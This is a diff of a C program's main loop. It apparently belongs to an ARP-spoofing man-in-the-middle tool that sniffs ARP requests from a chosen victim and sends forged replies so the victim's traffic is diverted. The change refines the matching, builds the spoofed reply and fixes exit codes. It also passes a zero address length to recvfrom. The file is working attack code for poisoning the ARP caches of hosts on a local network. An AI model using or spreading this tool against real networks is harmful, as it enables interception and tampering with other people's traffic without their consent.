@@ -2,74 +2,68 @@
 #include <fcntl.h>
 #include <net/ethernet.h>
 #include <netinet/ip.h>
+#include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
-#include <time.h>
 #include <unistd.h>
 
 #include "args.h"
 #include "arp.h"
 
 bool run(int sfd, mm_args_t *args) {
-  int size;
+  long size = 0;
+  struct sockaddr_storage fromaddr;
+  socklen_t fromlen = 0;
   uint8_t buffer[ARP_PACKET_SIZE];
 
-  struct timeval tv;
-  tv.tv_sec = 1;
-  tv.tv_usec = 0;
-  if (setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
-    fprintf(stderr, "Error setting socket option: %s\n", strerror(errno));
-  }
-
-  time_t last_announce = time(NULL);
-
   while (true) {
-    size = recvfrom(sfd, buffer, ARP_PACKET_SIZE, 0, NULL, NULL);
+    size = recvfrom(sfd, buffer, ARP_PACKET_SIZE, 0,
+                    (struct sockaddr *)&fromaddr, &fromlen);
 
     if (size < 0) {
-      if (errno != EAGAIN && errno != EWOULDBLOCK) {
-        fprintf(stderr, "Error reading from socket: %s\n", strerror(errno));
-        return false;
-      }
-    } else {
-      mm_arp_packet_t *p = NULL;
-      if (parse_arp_packet(&p, buffer) == false) {
-        free_arp_packet(p);
-        return false;
-      }
+      fprintf(stderr, "Error reading from socket: %s\n", strerror(errno));
+      return false;
+    }
 
-      printf("New ARP packet received\n");
+    mm_arp_packet_t *p = NULL;
+    if (parse_arp_packet(&p, buffer) == false) {
+      free_arp_packet(&p);
+      continue;
+    }
 
-      if (args->verbose) {
-        print_arp_packet(p);
-      }
+    printf("New ARP packet received\n");
 
-      if (p->sender_hardware_address == args->target_mac_address &&
-          *(uint32_t *)p->sender_protocol_address == args->target_ipv4) {
-        printf("ARP sender match target\n");
-        if (send_arp_packet(&(mm_arp_packet_t){}) == false) {
-          fprintf(stderr, "Error sending ARP reply");
+    if (args->verbose) {
+      print_arp_packet(p);
+    }
+
+    if (p->opcode == ARP_OPCODE_REQUEST &&
+        memcmp(p->sender_hardware_address, args->target_mac_address,
+               ARP_HARDWARE_ADDRESS_LENGTH) == 0 &&
+        p->sender_protocol_address == args->target_ipv4 &&
+        p->target_protocol_address == args->source_ipv4) {
+      printf("ARP request matches target and source\n");
+      mm_arp_packet_t *reply = create_arp_reply(p, args);
+      if (reply == NULL) {
+        fprintf(stderr, "Error creating ARP reply\n");
+      } else {
+        printf("Sending ARP reply\n");
+        if (send_arp_packet(sfd, fromaddr, fromlen, reply, args->verbose) ==
+            false) {
+          fprintf(stderr, "Error sending ARP packet: %s\n", strerror(errno));
         } else {
-          printf("Spoofed ARP reply sent");
+          printf("Spoofed ARP reply sent\n");
         }
-      } else {
-        printf("ARP sender doest not match target\n");
       }
-
-      free_arp_packet(p);
+      free_arp_packet(&reply);
+    } else {
+      printf("ARP sender doest not match target\n");
     }
 
-    if (time(NULL) - last_announce > 1000 && args->announce) {
-      printf("Sending ARP announce");
-      if (send_arp_packet(&(mm_arp_packet_t){}) == false) {
-        fprintf(stderr, "Error sending ARP announce");
-      } else {
-        printf("ARP annouce sent");
-      }
-      last_announce = time(NULL);
-    }
+    free_arp_packet(&p);
   }
 
   return true;
@@ -94,11 +88,11 @@ int main(int argc, char **argv) {
     return EXIT_FAILURE;
   }
 
-  bool error = run(sfd, args);
+  bool success = run(sfd, args);
 
   close(sfd);
 
   cleanup_args(args);
 
-  return error ? EXIT_FAILURE : EXIT_SUCCESS;
+  return success ? EXIT_SUCCESS : EXIT_FAILURE;
 }
